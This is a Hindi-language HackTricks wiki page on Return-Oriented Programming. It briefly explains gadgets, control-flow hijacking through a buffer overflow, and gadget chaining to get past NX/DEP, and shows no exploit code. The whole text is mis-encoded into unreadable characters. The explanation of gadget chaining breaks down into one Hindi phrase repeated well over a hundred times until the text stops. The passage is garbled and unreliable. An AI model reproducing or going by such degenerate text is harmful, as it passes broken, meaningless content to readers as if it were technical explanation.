# ROP - ‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§ì‡§∞‡§ø‡§è‡§Ç‡§ü‡•á‡§° ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡§ø‡§Ç‡§ó

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ AWS ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ GCP ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡•á‡§™‡•ã ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á‡•§

</details>
{% endhint %}

## **‡§Æ‡•Ç‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**

**‡§∞‡§ø‡§ü‡§∞‡•ç‡§®-‡§ì‡§∞‡§ø‡§è‡§Ç‡§ü‡•á‡§° ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡§ø‡§Ç‡§ó (ROP)** ‡§è‡§ï ‡§â‡§®‡•ç‡§®‡§§ ‡§∂‡•ã‡§∑‡§£ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **No-Execute (NX)** ‡§Ø‡§æ **‡§°‡•á‡§ü‡§æ ‡§è‡§ï‡•ç‡§ú‡•Ä‡§ï‡•ç‡§Ø‡•Ç‡§∂‡§® ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§Ç‡§∂‡§® (DEP)** ‡§ú‡•à‡§∏‡•Ä ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§â‡§™‡§æ‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ü‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§î‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•Ä ‡§¨‡§ú‡§æ‡§Ø, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Ø‡§æ ‡§≤‡•ã‡§°‡•á‡§° ‡§≤‡§æ‡§á‡§¨‡•ç‡§∞‡•á‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§ï‡•ã‡§° ‡§ï‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç **"‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏"** ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§ó‡•à‡§ú‡•á‡§ü ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§: `ret` ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§è‡§ï ‡§õ‡•ã‡§ü‡•á ‡§∏‡•á ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§≤‡•á ‡§ú‡§æ‡§®‡§æ ‡§Ø‡§æ ‡§Ö‡§Ç‡§ï‡§ó‡§£‡§ø‡§§‡•Ä‡§Ø ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞‡§®‡§æ‡•§ ‡§á‡§® ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§è‡§ï ‡§∏‡§æ‡§• ‡§ú‡•ã‡§°‡§º‡§ï‡§∞, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï ‡§™‡•á‡§≤‡•ã‡§° ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§∏‡•á ‡§µ‡•á ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, NX/DEP ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•Ä ‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•ã ‡§™‡§æ‡§∞ ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è‡•§

### ROP ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à

1. **‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§´‡•ç‡§≤‡•ã ‡§π‡§æ‡§á‡§ú‡•à‡§ï‡§ø‡§Ç‡§ó**: ‡§™‡§π‡§≤‡•á, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§ï‡§ø‡§∏‡•Ä ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§´‡•ç‡§≤‡•ã ‡§ï‡•ã ‡§π‡§æ‡§á‡§ú‡•à‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§: ‡§è‡§ï ‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§∏‡§π‡•á‡§ú‡•Ä ‡§ó‡§à ‡§µ‡§æ‡§™‡§∏‡•Ä ‡§™‡§§‡§æ ‡§ï‡•ã ‡§Ö‡§ß‡§ø‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§
2. **‡§ó‡•à‡§ú‡•á‡§ü ‡§ö‡•á‡§®‡§ø‡§Ç‡§ó**: ‡§´‡§ø‡§∞ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ß‡•ç‡§Ø‡§æ‡§®‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§ö‡•á‡§®‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§µ‡§π ‡§µ‡§æ‡§Ç‡§õ‡§ø‡§§ ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§ï‡§ø‡§∏‡•Ä ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á 